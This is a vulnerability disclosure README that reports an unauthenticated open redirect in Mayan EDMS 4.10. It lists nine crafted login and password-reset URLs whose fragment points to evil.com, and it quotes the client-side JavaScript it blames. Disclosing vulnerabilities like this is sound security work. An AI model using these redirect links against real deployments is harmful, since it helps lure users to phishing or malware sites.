# Mayan-EDMS-OpenRedirect-POC
Mayan EDMS – Open Redirect Vulnerability Unauthenticated, Version 4.10(latest)


An unauthenticated Open Redirect vulnerability was discovered in Mayan EDMS.
Multiple endpoints improperly process user-controlled values from the URL fragment (#) and the next parameter without validation or sanitization.

This allows an attacker to redirect victims to arbitrary external websites (e.g., phishing domains, malware pages, credential harvesters) simply by tricking them into opening a crafted link.

This issue occurs due to insecure handling of window.location inside client-side JavaScript templates.


Affected Endpoints

The following URLs are vulnerable to Open Redirect via the hash fragment (#) and/or the next parameter, allowing attackers to specify an arbitrary external target:

http://192.168.138.108/authentication/login/#https://evil.com

http://192.168.138.108/authentication/password/reset/#https://evil.com

http://192.168.138.108/authentication/login/?next=/search/advanced/#https://evil.com

http://192.168.138.108/authentication/login/?next=/checkouts/#https://evil.com

http://192.168.138.108/authentication/login/?next=/#https://evil.com

http://192.168.138.108/authentication/login/?next=/home/#https://evil.com

http://192.168.138.108/authentication/password/reset/done/#https://evil.com

http://192.168.138.108/authentication/login/?next=/search/advanced/%3F_search_model_pk%3Ddocuments.documentsearchresult/#https://evil.com

http://192.168.138.108/authentication/login/?next=/search/advanced/%3F_search_model_pk%3D/#https://evil.com


All endpoints behave the same because they rely on the same vulnerable JavaScript fragment.

Root Cause (Vulnerable Code)

The vulnerable DOM logic is located in the primary template used for navigation handling:

if (typeof partialNavigation === 'undefined') {
    document.write('<script type="text/undefined">')
    const currentLocation = '#' + window.location.pathname + window.location.search;
    const url = new URL(currentLocation, window.location.origin)
    window.location = url;
}


window.location.hash (fully attacker-controlled) is appended to the application’s navigation logic and executed without sanitization → redirect to external domain.
